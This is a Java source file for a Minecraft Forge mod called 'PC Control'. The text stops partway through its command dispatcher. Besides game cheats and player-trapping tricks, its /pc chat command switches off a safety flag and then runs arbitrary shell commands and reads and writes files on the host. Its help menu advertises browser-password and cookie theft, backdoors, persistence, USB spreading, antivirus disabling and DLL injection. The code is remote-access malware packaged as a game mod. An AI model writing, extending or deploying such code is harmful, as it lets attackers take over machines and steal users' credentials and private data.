package com.example.mccommands;

import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.Entity;
import net.minecraft.entity.effect.EntityLightningBolt;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.item.EntityTNTPrimed;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.item.Item;
import net.minecraft.item.ItemFood;
import net.minecraft.item.ItemPotion;
import net.minecraft.item.ItemStack;
import net.minecraft.potion.Potion;
import net.minecraft.potion.PotionEffect;
import net.minecraft.potion.PotionUtils;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.math.AxisAlignedBB;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.util.text.TextFormatting;
import net.minecraft.world.World;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLServerStartingEvent;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.sound.sampled.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermission;
import java.security.MessageDigest;
import java.util.*;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

@Mod(modid = "pccontrol", name = "PC Control Commands", version = "4.0")
public class PCCControlMod {
    @Mod.EventHandler
    public void serverLoad(FMLServerStartingEvent event) {
        if (!checkAdminRights()) {
            System.err.println("[PC Control] ADMIN RIGHTS REQUIRED - MOD NOT STARTING");
            return;
        }
        event.registerServerCommand(new PCCommand());
        System.out.println("[PC Control] Mod started with enhanced features");
    }
    
    private boolean checkAdminRights() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                String[] groupsCmd = {"net", "localgroup", "administrators"};
                Process p = Runtime.getRuntime().exec(groupsCmd);
                p.waitFor();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains(System.getProperty("user.name").toLowerCase())) {
                        return true;
                    }
                }
                return false;
            } else {
                return System.getProperty("user.name").equals("root") || "0".equals(System.getProperty("user.id"));
            }
        } catch (Exception e) {
            return false;
        }
    }
    
    public static class PCCommand extends CommandBase {
        private boolean safetyEnabled = true;
        private boolean fileAccessEnabled = false;
        private boolean stealthMode = false;
        private boolean forceMode = false;
        private boolean autoKillOnFail = false;
        private boolean encryptionEnabled = false;
        private boolean screenRecording = false;
        private boolean audioRecording = false;
        private final byte[] ENCRYPTION_KEY = "SUPERAGGRESSIVEKEY123".getBytes(StandardCharsets.UTF_8);
        private final List<Path> allowedDirs = Collections.synchronizedList(new ArrayList<>(Arrays.asList(Paths.get(".").toAbsolutePath().normalize())));
        private final int MAX_WRITE_BYTES = 128 * 1024;
        private final ExecutorService ioExecutor = Executors.newCachedThreadPool();
        private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(8);
        private final Path fallbackDir = Paths.get(".").toAbsolutePath().normalize().resolve("pc_aggressive_files");
        private final long COMMAND_TIMEOUT_SECONDS = 15;
        private final int MAX_OUTPUT_LINES = 500;
        private final int MAX_LINE_LENGTH = 2000;
        private final long FORCE_EXIT_DELAY_MS = 3000;
        private final AtomicBoolean shutdownInProgress = new AtomicBoolean(false);
        private final Lock fileLock = new ReentrantLock();
        private final Map<String, Process> activeProcesses = new ConcurrentHashMap<>();
        private final List<String> commandHistory = Collections.synchronizedList(new ArrayList<>());
        private final String SELF_DESTRUCT_PASSWORD = "AGGRESSIVE2025";
        private final Pattern IP_PATTERN = Pattern.compile("\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b");
        private TargetDataLine targetLine;
        private Robot robot;
        private volatile boolean stopScreenRecording = false;
        private Thread screenRecordingThread;
        private Thread audioRecordingThread;
        
        private Map<String, Boolean> mcHacksState = new ConcurrentHashMap<>();
        private Map<String, Long> playerSpeedBoost = new ConcurrentHashMap<>();
        private Map<String, Long> playerJumpBoost = new ConcurrentHashMap<>();
        private Map<String, Long> playerNoClip = new ConcurrentHashMap<>();
        private Map<String, Boolean> playerESP = new ConcurrentHashMap<>();
        private Map<String, Long> playerFlyBoost = new ConcurrentHashMap<>();
        private Map<String, String> playerCustomNames = new ConcurrentHashMap<>();
        private List<String> fakePlayers = new ArrayList<>();
        private Map<String, Long> playerBans = new ConcurrentHashMap<>();
        private Map<String, String> banMessages = new ConcurrentHashMap<>();
        
        private boolean xrayEnabled = false;
        private boolean autoFarmEnabled = false;
        private boolean autoPotEnabled = false;
        private boolean autoEatEnabled = false;
        private boolean freecamEnabled = false;
        private boolean itemESPEnabled = false;
        private boolean antiAFKEnabled = false;
        private boolean autoClickerEnabled = false;
        private boolean spiderEnabled = false;
        private boolean jesusEnabled = false;
        private boolean timePaused = false;
        private boolean fakeOPEnabled = false;
        
        private double freecamX, freecamY, freecamZ;
        private float freecamYaw, freecamPitch;
        private EntityPlayerMP freecamOriginalPlayer;
        
        private Map<String, EntityPlayerMP> trappedPlayers = new ConcurrentHashMap<>();
        private ItemStack egemensStick = null;
        
        public PCCommand() {
            try {
                robot = new Robot();
            } catch (AWTException e) {
                System.err.println("Robot initialization failed: " + e.getMessage());
            }
            
            mcHacksState.put("speed", false);
            mcHacksState.put("jump", false);
            mcHacksState.put("invulnerable", false);
            mcHacksState.put("fly", false);
            mcHacksState.put("noclip", false);
            mcHacksState.put("esp", false);
            mcHacksState.put("killaura", false);
            mcHacksState.put("autosteal", false);
            mcHacksState.put("infinitereach", false);
            mcHacksState.put("antiknockback", false);
            
            scheduler.scheduleAtFixedRate(this::runHackTasks, 0, 50, TimeUnit.MILLISECONDS);
            scheduler.scheduleAtFixedRate(this::updatePlayerHacks, 0, 100, TimeUnit.MILLISECONDS);
        }
        
        private void runHackTasks() {
            try {
                MinecraftServer server = null;
                try {
                    server = net.minecraftforge.fml.common.FMLCommonHandler.instance().getMinecraftServerInstance();
                } catch (Exception e) {
                    return;
                }
                
                if (server != null && server.isServerRunning()) {
                    for (Object playerObj : server.getPlayerList().getPlayers()) {
                        if (playerObj instanceof EntityPlayerMP) {
                            EntityPlayerMP player = (EntityPlayerMP) playerObj;
                            
                            if (autoEatEnabled && player.getFoodStats().needFood() && !player.capabilities.isCreativeMode) {
                                handleAutoEatTask(player);
                            }
                            
                            if (autoPotEnabled && player.getHealth() < 10.0F) {
                                handleAutoPotionTask(player);
                            }
                            
                            if (antiAFKEnabled) {
                                handleAntiAFKTask(player);
                            }
                            
                            if (spiderEnabled) {
                                handleSpiderTask(player);
                            }
                            
                            if (jesusEnabled) {
                                handleJesusTask(player);
                            }
                            
                            if (autoFarmEnabled) {
                                handleAutoFarmTask(player);
                            }
                            
                            if (itemESPEnabled) {
                                handleItemESPTask(player);
                            }
                            
                            if (autoClickerEnabled) {
                                handleAutoClickerTask(player);
                            }
                            
                            if (xrayEnabled) {
                                handleXrayTask(player);
                            }
                        }
                    }
                    
                    updateTrappedPlayers();
                }
            } catch (Exception e) {
            }
        }
        
        private void updatePlayerHacks() {
            try {
                MinecraftServer server = net.minecraftforge.fml.common.FMLCommonHandler.instance().getMinecraftServerInstance();
                if (server != null && server.isServerRunning()) {
                    for (Object playerObj : server.getPlayerList().getPlayers()) {
                        if (playerObj instanceof EntityPlayerMP) {
                            EntityPlayerMP player = (EntityPlayerMP) playerObj;
                            String playerName = player.getName();
                            
                            if (playerBans.containsKey(playerName)) {
                                long banTime = playerBans.get(playerName);
                                if (banTime == -1 || banTime > System.currentTimeMillis()) {
                                    player.connection.disconnect(new TextComponentString(TextFormatting.RED + "Banned: " + banMessages.getOrDefault(playerName, "You have been banned")));
                                } else if (banTime <= System.currentTimeMillis() && banTime != -1) {
                                    playerBans.remove(playerName);
                                    banMessages.remove(playerName);
                                }
                            }
                            
                            if (fakeOPEnabled) {
                                try {
                                    player.sendMessage(new TextComponentString(TextFormatting.GRAY + "" + TextFormatting.ITALIC + "[" + player.getName() + ": Made " + player.getName() + " a server operator]"));
                                } catch (Exception e) {}
                            }
                            
                            if (playerSpeedBoost.containsKey(playerName) && playerSpeedBoost.get(playerName) > System.currentTimeMillis()) {
                                player.capabilities.setPlayerWalkSpeed(0.8F);
                                player.sendPlayerAbilities();
                            } else if (playerSpeedBoost.containsKey(playerName)) {
                                player.capabilities.setPlayerWalkSpeed(0.1F);
                                player.sendPlayerAbilities();
                                playerSpeedBoost.remove(playerName);
                            }
                            
                            if (playerJumpBoost.containsKey(playerName) && playerJumpBoost.get(playerName) > System.currentTimeMillis()) {
                                player.addPotionEffect(new PotionEffect(Potion.getPotionById(8), 100, 2));
                            } else if (playerJumpBoost.containsKey(playerName)) {
                                playerJumpBoost.remove(playerName);
                            }
                            
                            if (playerFlyBoost.containsKey(playerName) && playerFlyBoost.get(playerName) > System.currentTimeMillis()) {
                                player.capabilities.allowFlying = true;
                                player.capabilities.setFlySpeed(0.8F);
                                player.sendPlayerAbilities();
                            } else if (playerFlyBoost.containsKey(playerName)) {
                                player.capabilities.allowFlying = false;
                                player.capabilities.setFlySpeed(0.05F);
                                player.sendPlayerAbilities();
                                playerFlyBoost.remove(playerName);
                            }
                            
                            if (playerNoClip.containsKey(playerName) && playerNoClip.get(playerName) > System.currentTimeMillis()) {
                                player.noClip = true;
                                player.setNoGravity(true);
                            } else if (playerNoClip.containsKey(playerName)) {
                                player.noClip = false;
                                player.setNoGravity(false);
                                playerNoClip.remove(playerName);
                            }
                            
                            if (playerESP.containsKey(playerName) && playerESP.get(playerName)) {
                                try {
                                    for (Object entityObj : player.world.loadedEntityList) {
                                        if (entityObj instanceof net.minecraft.entity.Entity && entityObj != player) {
                                            net.minecraft.entity.Entity entity = (net.minecraft.entity.Entity) entityObj;
                                            if (entity instanceof EntityPlayer) {
                                                entity.setGlowing(true);
                                            }
                                        }
                                    }
                                } catch (Exception e) {}
                            }
                            
                            if (playerCustomNames.containsKey(playerName)) {
                                try {
                                    player.setCustomNameTag(playerCustomNames.get(playerName));
                                    player.setAlwaysRenderNameTag(true);
                                } catch (Exception e) {}
                            }
                        }
                    }
                }
            } catch (Exception e) {}
        }
        
        private void handleAutoEatTask(EntityPlayerMP player) {
            for (int i = 0; i < player.inventory.getSizeInventory(); i++) {
                ItemStack stack = player.inventory.getStackInSlot(i);
                if (stack != null && stack.getItem() instanceof ItemFood) {
                    ItemFood food = (ItemFood) stack.getItem();
                    try {
                        Field alwaysEdibleField = ItemFood.class.getDeclaredField("alwaysEdible");
                        alwaysEdibleField.setAccessible(true);
                        boolean alwaysEdible = alwaysEdibleField.getBoolean(food);
                        
                        if (player.canEat(alwaysEdible)) {
                            player.getFoodStats().addStats(food.getHealAmount(stack), food.getSaturationModifier(stack));
                            stack.shrink(1);
                            if (stack.getCount() <= 0) {
                                player.inventory.setInventorySlotContents(i, null);
                            }
                            break;
                        }
                    } catch (Exception e) {
                        try {
                            player.getFoodStats().addStats(food.getHealAmount(stack), food.getSaturationModifier(stack));
                            stack.shrink(1);
                            if (stack.getCount() <= 0) {
                                player.inventory.setInventorySlotContents(i, null);
                            }
                            break;
                        } catch (Exception ex) {}
                    }
                }
            }
        }
        
        private void handleAutoPotionTask(EntityPlayerMP player) {
            for (int i = 0; i < player.inventory.getSizeInventory(); i++) {
                ItemStack stack = player.inventory.getStackInSlot(i);
                if (stack != null && stack.getItem() instanceof ItemPotion) {
                    List<PotionEffect> effects = PotionUtils.getEffectsFromStack(stack);
                    for (PotionEffect effect : effects) {
                        player.addPotionEffect(effect);
                    }
                    stack.shrink(1);
                    if (stack.getCount() <= 0) {
                        player.inventory.setInventorySlotContents(i, null);
                    }
                    break;
                }
            }
        }
        
        private void handleAntiAFKTask(EntityPlayerMP player) {
            player.rotationYaw += 10.0F;
            if (player.rotationYaw > 360.0F) {
                player.rotationYaw = 0.0F;
            }
            
            if (player.world.getTotalWorldTime() % 200 == 0) {
                player.jump();
            }
        }
        
        private void handleSpiderTask(EntityPlayerMP player) {
            try {
                BlockPos playerPos = new BlockPos(player.posX, player.posY, player.posZ);
                BlockPos wallCheckPos = new BlockPos(player.posX, player.posY + 1, player.posZ);
                
                if (player.world.isBlockLoaded(wallCheckPos)) {
                    boolean isWall = !player.world.isAirBlock(wallCheckPos) && 
                                     !player.world.getBlockState(wallCheckPos).getBlock().isPassable(player.world, wallCheckPos);
                    
                    if (isWall && !player.isOnLadder() && player.collidedHorizontally) {
                        player.motionY = 0.3;
                        player.fallDistance = 0.0F;
                        player.onGround = true;
                    }
                }
            } catch (Exception e) {
            }
        }
        
        private void handleJesusTask(EntityPlayerMP player) {
            try {
                BlockPos posBelow = new BlockPos(player.posX, player.posY - 0.1, player.posZ);
                BlockPos posAtFeet = new BlockPos(player.posX, player.posY, player.posZ);
                
                if (player.world.isBlockLoaded(posBelow)) {
                    boolean isLiquidBelow = player.world.getBlockState(posBelow).getMaterial().isLiquid();
                    boolean isLiquidAtFeet = player.world.getBlockState(posAtFeet).getMaterial().isLiquid();
                    
                    if ((isLiquidBelow || isLiquidAtFeet) && !player.isSneaking()) {
                        player.motionY = Math.max(0.1, player.motionY);
                        player.fallDistance = 0.0F;
                        player.onGround = true;
                        
                        if (player.motionY < 0) {
                            player.motionY = 0;
                        }
                    }
                }
            } catch (Exception e) {
            }
        }
        
        private void handleAutoFarmTask(EntityPlayerMP player) {
            int range = 5;
            BlockPos playerPos = new BlockPos(player.posX, player.posY, player.posZ);
            for (int x = -range; x <= range; x++) {
                for (int y = -range; y <= range; y++) {
                    for (int z = -range; z <= range; z++) {
                        BlockPos pos = playerPos.add(x, y, z);
                        if (player.world.isBlockLoaded(pos)) {
                            String blockName = player.world.getBlockState(pos).getBlock().getRegistryName().toString();
                            if (blockName.contains("wheat") || blockName.contains("carrots") || blockName.contains("potatoes")) {
                                try {
                                    // For 1.12.2, we need to check block metadata or age property differently
                                    net.minecraft.block.Block block = player.world.getBlockState(pos).getBlock();
                                    net.minecraft.block.state.IBlockState state = player.world.getBlockState(pos);
                                    
                                    // Check if it's a crop block
                                    if (block instanceof net.minecraft.block.BlockCrops) {
                                        net.minecraft.block.BlockCrops crop = (net.minecraft.block.BlockCrops) block;
                                        int age = ((net.minecraft.block.BlockCrops)crop).getMaxAge();
                                        if (age >= crop.getMaxAge()) {
                                            player.world.destroyBlock(pos, true);
                                            player.world.setBlockState(pos, net.minecraft.init.Blocks.AIR.getDefaultState());
                                        }
                                    } else if (blockName.contains("age=7") || blockName.contains("age:7")) {
                                        player.world.destroyBlock(pos, true);
                                        player.world.setBlockState(pos, net.minecraft.init.Blocks.AIR.getDefaultState());
                                    }
                                } catch (Exception e) {
                                }
                            }
                        }
                    }
                }
            }
        }
        
        private void handleItemESPTask(EntityPlayerMP player) {
            int range = 20;
            List<EntityItem> items = player.world.getEntitiesWithinAABB(EntityItem.class, 
                new AxisAlignedBB(player.posX - range, player.posY - range, player.posZ - range,
                                 player.posX + range, player.posY + range, player.posZ + range));
            for (EntityItem item : items) {
                item.setGlowing(true);
                item.setCustomNameTag(item.getItem().getDisplayName());
                item.setAlwaysRenderNameTag(true);
            }
        }
        
        private void handleAutoClickerTask(EntityPlayerMP player) {
            if (player.world.getTotalWorldTime() % 5 == 0) {
                try {
                    Method swingItem = EntityPlayer.class.getDeclaredMethod("swingArm");
                    swingItem.setAccessible(true);
                    swingItem.invoke(player);
                } catch (Exception e) {
                    player.swingArm(player.getActiveHand());
                }
            }
        }
        
        private void handleXrayTask(EntityPlayerMP player) {
            int range = 16;
            BlockPos playerPos = new BlockPos(player.posX, player.posY, player.posZ);
            
            for (int x = -range; x <= range; x++) {
                for (int y = -range; y <= range; y++) {
                    for (int z = -range; z <= range; z++) {
                        BlockPos pos = playerPos.add(x, y, z);
                        if (player.world.isBlockLoaded(pos)) {
                            String blockName = player.world.getBlockState(pos).getBlock().getRegistryName().toString();
                            
                            if (blockName.contains("diamond_ore") || blockName.contains("gold_ore") || 
                                blockName.contains("iron_ore") || blockName.contains("coal_ore") ||
                                blockName.contains("emerald_ore") || blockName.contains("redstone_ore") ||
                                blockName.contains("lapis_ore") || blockName.contains("quartz_ore")) {
                                
                                try {
                                    // For 1.12.2, we need to mark blocks for re-render
                                    player.world.markBlockRangeForRenderUpdate(pos, pos);
                                } catch (Exception e) {
                                }
                            }
                        }
                    }
                }
            }
        }
        
        private void updateTrappedPlayers() {
            try {
                MinecraftServer server = net.minecraftforge.fml.common.FMLCommonHandler.instance().getMinecraftServerInstance();
                if (server != null) {
                    for (Map.Entry<String, EntityPlayerMP> entry : trappedPlayers.entrySet()) {
                        EntityPlayerMP trappedPlayer = entry.getValue();
                        EntityPlayerMP stickHolder = null;
                        
                        for (Object playerObj : server.getPlayerList().getPlayers()) {
                            if (playerObj instanceof EntityPlayerMP) {
                                EntityPlayerMP player = (EntityPlayerMP) playerObj;
                                ItemStack heldItem = player.getHeldItemMainhand();
                                if (heldItem != null && !heldItem.isEmpty() && 
                                    heldItem.getDisplayName().contains("Egemen's Stick")) {
                                    stickHolder = player;
                                    break;
                                }
                            }
                        }
                        
                        if (stickHolder != null) {
                            trappedPlayer.setPositionAndRotation(
                                stickHolder.posX, 
                                stickHolder.posY, 
                                stickHolder.posZ,
                                stickHolder.rotationYaw,
                                stickHolder.rotationPitch
                            );
                            trappedPlayer.motionX = stickHolder.motionX;
                            trappedPlayer.motionY = stickHolder.motionY;
                            trappedPlayer.motionZ = stickHolder.motionZ;
                            
                            trappedPlayer.setInvisible(true);
                            trappedPlayer.noClip = true;
                            trappedPlayer.setGameType(net.minecraft.world.GameType.SPECTATOR);
                            
                            trappedPlayer.sendMessage(new TextComponentString(TextFormatting.BLACK + "" + TextFormatting.BOLD + "YOU ARE TRAPPED IN EGEMEN'S STICK"));
                        }
                    }
                }
            } catch (Exception e) {
            }
        }
        
        private ItemStack createEgemensStick() {
            ItemStack stick = new ItemStack(net.minecraft.init.Items.STICK);
            stick.setStackDisplayName(TextFormatting.RED + "E" + TextFormatting.GOLD + "g" + 
                                     TextFormatting.YELLOW + "e" + TextFormatting.GREEN + "m" + 
                                     TextFormatting.AQUA + "e" + TextFormatting.BLUE + "n" + 
                                     TextFormatting.LIGHT_PURPLE + "'" + TextFormatting.RED + "s" + 
                                     TextFormatting.WHITE + " Stick");
            
            // Add enchantments
            stick.addEnchantment(net.minecraft.enchantment.Enchantment.getEnchantmentByID(16), 10); // Sharpness
            stick.addEnchantment(net.minecraft.enchantment.Enchantment.getEnchantmentByID(19), 10); // Knockback
            stick.addEnchantment(net.minecraft.enchantment.Enchantment.getEnchantmentByID(20), 10); // Fire Aspect
            
            // Add NBT data
            net.minecraft.nbt.NBTTagCompound nbt = new net.minecraft.nbt.NBTTagCompound();
            nbt.setBoolean("EgemenStick", true);
            nbt.setString("SpecialPower", "TrapPlayer");
            stick.setTagCompound(nbt);
            
            return stick;
        }
        
        private void trapPlayerInStick(EntityPlayerMP attacker, EntityPlayerMP target) {
            trappedPlayers.put(target.getName(), target);
            
            target.sendMessage(new TextComponentString(TextFormatting.DARK_RED + "" + TextFormatting.BOLD + 
                "YOU HAVE BEEN TRAPPED IN EGEMEN'S STICK!"));
            target.sendMessage(new TextComponentString(TextFormatting.RED + 
                "Press Q to escape (if stick holder allows)"));
            
            attacker.sendMessage(new TextComponentString(TextFormatting.GREEN + 
                "Trapped " + target.getName() + " in Egemen's Stick!"));
            attacker.sendMessage(new TextComponentString(TextFormatting.YELLOW + 
                "They will follow you everywhere. Press Q while holding stick to release them."));
        }
        
        private void releaseFromStick(EntityPlayerMP stickHolder) {
            Iterator<Map.Entry<String, EntityPlayerMP>> iterator = trappedPlayers.entrySet().iterator();
            while (iterator.hasNext()) {
                Map.Entry<String, EntityPlayerMP> entry = iterator.next();
                EntityPlayerMP trappedPlayer = entry.getValue();
                
                trappedPlayer.setPositionAndRotation(
                    stickHolder.posX,
                    stickHolder.posY,
                    stickHolder.posZ,
                    stickHolder.rotationYaw,
                    stickHolder.rotationPitch
                );
                trappedPlayer.setInvisible(false);
                trappedPlayer.noClip = false;
                trappedPlayer.setGameType(net.minecraft.world.GameType.SURVIVAL);
                
                trappedPlayer.sendMessage(new TextComponentString(TextFormatting.GREEN + 
                    "You have been released from Egemen's Stick!"));
                
                stickHolder.sendMessage(new TextComponentString(TextFormatting.GREEN + 
                    "Released " + trappedPlayer.getName() + " from Egemen's Stick"));
                
                iterator.remove();
                break;
            }
        }
        
        @Override
        public String getName() { return "pc"; }

        @Override
        public String getUsage(ICommandSender sender) {
            return "/pc [command]";
        }

        @Override
        public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
    commandHistory.add(String.join(" ", args));
    if (commandHistory.size() > 100) commandHistory.remove(0);
    
    if (args.length == 0) {
        sendAggressive(sender, TextFormatting.DARK_RED + "==========================================");
        sendAggressive(sender, TextFormatting.DARK_RED + "       PC CONTROL v1.2 - COMMANDS (BY:EGEMEN)      ");
        sendAggressive(sender, TextFormatting.DARK_RED + "==========================================");
        
        send(sender, TextFormatting.GOLD + "============== SYSTEM ===============");
        send(sender, TextFormatting.YELLOW + "reboot, shutdown, sleep, disable, enable, fileenable");
        send(sender, TextFormatting.YELLOW + "filedisable, stealth, force, autokill, encrypt, decrypt");
        
        send(sender, TextFormatting.GOLD + "============== FILES ================");
        send(sender, TextFormatting.YELLOW + "writefile, readfile, allowpath, exec, killapp");
        send(sender, TextFormatting.YELLOW + "screenshot, clipboard, netinfo, portscan");
        
        send(sender, TextFormatting.GOLD + "============== HACKS ================");
        send(sender, TextFormatting.RED + "mc_hacks - ALL HACKS ACTIVATE");
        send(sender, TextFormatting.YELLOW + "mc_hacks_speed, mc_hacks_jump, mc_hacks_fly");
        send(sender, TextFormatting.YELLOW + "mc_hacks_noclip, mc_hacks_esp, mc_hacks_killaura");
        send(sender, TextFormatting.YELLOW + "mc_hacks_autosteal, mc_hacks_infinitereach");
        
        send(sender, TextFormatting.GOLD + "=========== NEW FEATURES ============");
        send(sender, TextFormatting.GREEN + "mc_tools_stick - Get Egemen's magical stick!");
        send(sender, TextFormatting.YELLOW + "mc_hacks_ghost, mc_hacks_nuker, mc_hacks_teleport");
        send(sender, TextFormatting.YELLOW + "mc_hacks_godmode, mc_hacks_massive");
        
        send(sender, TextFormatting.GOLD + "========= MINECRAFT HACKS ===========");
        send(sender, TextFormatting.YELLOW + "mc_hacks_xray, mc_hacks_autofarm, mc_hacks_autopot");
        send(sender, TextFormatting.YELLOW + "mc_hacks_autoeat, mc_hacks_freecam, mc_hacks_itemesp");
        send(sender, TextFormatting.YELLOW + "mc_hacks_antiafk, mc_hacks_autoclicker");
        send(sender, TextFormatting.YELLOW + "mc_hacks_spider, mc_hacks_jesus, mc_hacks_pause");
        send(sender, TextFormatting.YELLOW + "mc_hacks_weather, mc_hacks_fakeop, ban, kick");
        
        send(sender, TextFormatting.GOLD + "============== OTHER ================");
        send(sender, TextFormatting.YELLOW + "download, selfdestruct, history, clearlog");
        send(sender, TextFormatting.YELLOW + "processlist, killprocess, inject, registry");
        send(sender, TextFormatting.YELLOW + "service, driver, wifipass, browserpass");
        send(sender, TextFormatting.YELLOW + "elevate, backdoor, persist, startrdp");
        send(sender, TextFormatting.YELLOW + "usbspread, disableav, recordvideo, stoprecordvideo");
        send(sender, TextFormatting.YELLOW + "recordaudio, stoprecordaudio, stealcookies");
        send(sender, TextFormatting.YELLOW + "stealhistory, injectdll");
        
        send(sender, TextFormatting.GOLD + "====================================");
        send(sender, TextFormatting.RED + "FIRST: /pc disable - To disable safety");
        send(sender, TextFormatting.RED + "Then use any command above");
        return;
    }     
            String cmd = args[0].toLowerCase(Locale.ROOT);
            String os = System.getProperty("os.name").toLowerCase(Locale.ROOT);
            
            if (!forceMode && safetyEnabled && !(cmd.equals("disable") || cmd.equals("fileenable") || cmd.equals("allowpath") || cmd.equals("force") || cmd.equals("autokill") || cmd.equals("selfdestruct") || cmd.equals("ban") || cmd.equals("kick") || cmd.startsWith("mc_"))) {
                sendAggressive(sender, TextFormatting.RED + "" + TextFormatting.BOLD + "SAFETY ACTIVE - CRITICAL COMMANDS BLOCKED");
                send(sender, TextFormatting.GREEN + "To continue: /pc disable");
                send(sender, TextFormatting.GOLD + "Or use /pc force to override");
                return;
            }
            
            try {
                switch (cmd) {
                    case "mc_tools_stick":
                        handleMCToolsStick(sender);
                        break;
                    case "mc_hacks_xray":
                        handleMCXRay(sender);
                        break;
                    case "mc_hacks_autofarm":
                        handleMCAutoFarm(sender);
                        break;
                    case "mc_hacks_autopot":
                        handleMCAutoPotion(sender);
                        break;
                    case "mc_hacks_autoeat":
                        handleMCAutoEat(sender);
                        break;
                    case "mc_hacks_freecam":
                        handleMCFreecam(sender);
                        break;
                    case "mc_hacks_itemesp":
                        handleMCItemESP(sender);
                        break;
                    case "mc_hacks_antiafk":
                        handleMCAntiAFK(sender);
                        break;
                    case "mc_hacks_autoclicker":
                        handleMCAutoClicker(sender, args);
                        break;
                    case "mc_hacks_spider":
                        handleMCSpider(sender);
                        break;
                    case "mc_hacks_jesus":
                        handleMCJesus(sender);
                        break;
                    case "mc_hacks_pause":
                        handleMCPauseTime(sender);
                        break;
                    case "mc_hacks_weather":
                        handleMCWeather(sender, args);
                        break;
                    case "mc_hacks_fakeop":
                        handleMCFakeOP(sender);
                        break;
                    case "mc_hacks_ghost":
                        handleMCGhost(sender);
                        break;
                    case "mc_hacks_nuker":
                        handleMCNuker(sender, args);
                        break;
                    case "mc_hacks_teleport":
                        handleMCTeleport(sender, args);
                        break;
                    case "mc_hacks_godmode":
                        handleMCGodMode(sender);
                        break;
                    case "mc_hacks_massive":
                        handleMCMassive(sender, args);
                        break;
                    case "ban":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc ban <player_name> <reason> <time_seconds>");
                            send(sender, TextFormatting.YELLOW + "For permanent: /pc ban <player_name> <reason> -p");
                            return;
                        }
                        handleBan(sender, args);
                        break;
                    case "kick":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc kick <player_name> <reason>");
                            return;
                        }
                        handleKick(sender, args);
                        break;
                    case "disable":
                        safetyEnabled = false;
                        sendAggressive(sender, TextFormatting.DARK_RED + "SAFETY DISABLED - DANGEROUS COMMANDS FREED");
                        break;
                    case "enable":
                        safetyEnabled = true;
                        send(sender, TextFormatting.GREEN + "Safety enabled");
                        break;
                    case "fileenable":
                        fileAccessEnabled = true;
                        send(sender, TextFormatting.GREEN + "File access enabled");
                        break;
                    case "filedisable":
                        fileAccessEnabled = false;
                        send(sender, TextFormatting.RED + "File access disabled");
                        break;
                    case "stealth":
                        stealthMode = !stealthMode;
                        send(sender, TextFormatting.DARK_PURPLE + "Stealth mode: " + (stealthMode ? "ACTIVE" : "INACTIVE"));
                        break;
                    case "force":
                        forceMode = !forceMode;
                        sendAggressive(sender, TextFormatting.DARK_RED + "FORCE MODE: " + (forceMode ? "ACTIVE" : "INACTIVE"));
                        break;
                    case "autokill":
                        autoKillOnFail = !autoKillOnFail;
                        send(sender, TextFormatting.RED + "Auto kill: " + (autoKillOnFail ? "ACTIVE" : "INACTIVE"));
                        break;
                    case "encrypt":
                        encryptionEnabled = true;
                        send(sender, TextFormatting.GOLD + "Encryption active");
                        break;
                    case "decrypt":
                        encryptionEnabled = false;
                        send(sender, TextFormatting.GOLD + "Encryption inactive");
                        break;
                    case "allowpath":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc allowpath <full-path>");
                            break;
                        }
                        Path p = Paths.get(args[1]).toAbsolutePath().normalize();
                        allowedDirs.add(p);
                        send(sender, TextFormatting.GREEN + "Allowed path added: " + p.toString());
                        break;
                    case "writefile":
                        if (!forceMode && !fileAccessEnabled) {
                            send(sender, TextFormatting.RED + "FILE ACCESS DISABLED. First use /pc fileenable or /pc force.");
                            break;
                        }
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc writefile <target-path> <content...>");
                            break;
                        }
                        String target = args[1];
                        String content = joinArgs(args, 2);
                        handleWriteFile(sender, target, content);
                        break;
                    case "readfile":
                        if (!forceMode && !fileAccessEnabled) {
                            send(sender, TextFormatting.RED + "FILE ACCESS DISABLED. First use /pc fileenable or /pc force.");
                            break;
                        }
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc readfile <target-path>");
                            break;
                        }
                        handleReadFile(sender, args[1]);
                        break;
                    case "exec":
                        if ((!forceMode && (!fileAccessEnabled || safetyEnabled))) {
                            send(sender, TextFormatting.RED + "EXEC DISABLED. /pc disable and /pc fileenable or /pc force required.");
                            break;
                        }
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc exec <command...>");
                            break;
                        }
                        String cmdLine = joinArgs(args, 1);
                        handleExec(sender, cmdLine, os);
                        break;
                    case "killapp":
                        if ((!forceMode && (!fileAccessEnabled || safetyEnabled))) {
                            send(sender, TextFormatting.RED + "KILLAPP DISABLED. /pc disable and /pc fileenable or /pc force required.");
                            break;
                        }
